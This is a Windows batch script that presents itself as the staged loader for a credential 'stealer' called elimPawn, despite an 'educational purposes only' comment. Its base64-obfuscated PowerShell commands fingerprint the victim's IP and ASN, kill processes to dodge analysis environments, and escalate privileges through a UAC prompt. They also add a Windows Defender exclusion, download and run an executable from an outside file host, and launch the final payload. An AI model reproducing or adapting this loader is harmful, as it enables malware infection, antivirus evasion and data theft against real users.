@echo off
cls
:: Educational purposes only :^)
:: Pre-obfuscated batch script, PowerShell commands encoded with base64

:: To decode run the following in PowerShell:
:: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('STRING TO DECODE'))

:: To re-encode, run the following in PowerShell:
:: [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("STRING TO ENCODE"))


echo [elimPawn] Stage 0 ; IP Check Via ASN

powershell -exec bypass -encodedCommand KABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAGkAcABpAGYAeQAuAG8AcgBnACkALgBDAG8AbgB0AGUAbgB0AA== > %TEMP%\ip.txt
set /p b=<%TEMP%\ip.txt
echo %b%

powershell -exec bypass -encodedCommand KABpAHcAcgAgACcAaAB0AHQAcAA6AC8ALwBpAHAALQBhAHAAaQAuAGMAbwBtAC8AbABpAG4AZQAvADEANAA2AC4ANwAwAC4AMQA5ADMALgAzADUAPwBmAGkAZQBsAGQAcwA9AHMAdABhAHQAdQBzACwAYQBzACcAKQAuAEMAbwBuAHQAZQBuAHQA > %TEMP%\ip.txt
findstr "success" < %TEMP%\ip.txt
if %ERRORLEVEL%==0 ( goto ipCheck ) else ( echo IP Check Fail && goto fail )

:fail
del %TEMP%\ip.txt 1>nul2>nul
exit /b 1

:ipCheck
setlocal enabledelayedexpansion
for /f "tokens=*" %%i in ('findstr "AS" %TEMP%\ip.txt') do (set "bb=%%i")
setlocal disabledelayedexpansion
powershell -exec bypass -encodedCommand KABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUAYgBpAG4ALgBjAG8AbQAvAHIAYQB3AC8AUABZAHIAZwBxADkAbgB3ACkALgBDAG8AbgB0AGUAbgB0AA== > %TEMP%\asn.txt
powershell -exec bypass -encodedCommand aQBmACAAKAAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzAFwAQQBEAE0ASQBOAEkAfgAxAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAFMATgAuAHQAeAB0ACcAKQAgAC0AYwBvAG4AdABhAGkAbgBzACAAKABbAHIAZQBnAGUAeABdADoAOgBNAGEAdABjAGgAKAAnAEEAUwA5ADAAMAA5ACcALAAgACcAXgAoAFwAUwArACkAJwApACkALgBHAHIAbwB1AHAAcwBbADEAXQAuAFYAYQBsAHUAZQAgACkAIAB7ACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAnAGMAbwBuAGgAbwBzAHQAJwAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlADsAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACcAYwBtAGQAJwAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlADsAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAnACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwAgAH0A



echo.&echo.
echo [elimPawn] Stage 1 ; Elevation

setlocal DisableDelayedExpansion
set "batchPath=%~dpnx0"
set "getPriv=%TEMP%\vb.vbs"
setlocal EnableDelayedExpansion

NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' ( goto gotPriv ) else ( goto getPriv )

:getPriv
if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPriv)
echo Set UAC = CreateObject^("Shell.Application"^) > "%getPriv%"
echo args = "ELEV " >> "%getPriv%" 
echo For Each strArg in WScript.Arguments >> "%getPriv%"
echo args = args ^& strArg ^& " "  >> "%getPriv%"
echo Next >> "%getPriv%"
echo args = "/c """ + "!batchPath!" + """ " + args >> %getPriv%
echo UAC.ShellExecute "%SystemRoot%\System32\cmd.exe", args, "", "runas", 1 >> %getPriv%
"%SystemRoot%\System32\WScript.exe" "%getPriv%" %*

:gotPriv
setlocal & cd /d %~dp0
if '%1'=='ELEV' (del "%getPriv%" 1>nul2>nul & shift /1)

whoami
echo.&echo.



echo [elimPawn] Stage 2 ; WinDefender Exclusion
powershell -exec bypass -encodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACcA 2>nul
del %localappdata%\stage2.ps1 1>nul2>nul



echo.&echo.
echo [elimPawn] Stage 3 ; EnvCheck
powershell -exec bypass -encodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgACcAaAB0AHQAcABzADoALwAvAGMAZABuADMALgBmAGkAbABlAGgAYQB1AHMALgBzAHUALwBmAGkAbABlAHMALwAxADcAMgAyADIAOQA1ADYAMgAyAF8AMgA4ADMANwA1AC8AZQBsAGkAbQBQAGEAdwBuAF8AZQBuAHYAQwBoAGUAYwBrAC4AZQB4AGUAJwAgACcAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZQBuAHYAQwBoAGUAYwBrAC4AZQB4AGUAJwA7ACAAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZQBuAHYAQwBoAGUAYwBrAC4AZQB4AGUA
del %localappdata%\envCheck.exe


echo.&echo.
echo [elimPawn] Stage 4 ; Final Payload
:: This is where our final payload of elimPawn will go, running the stealer :^)



echo.&echo.
echo [elimPawn] Stage 5 ; Execution
%localappdata%\elimPawn.exe
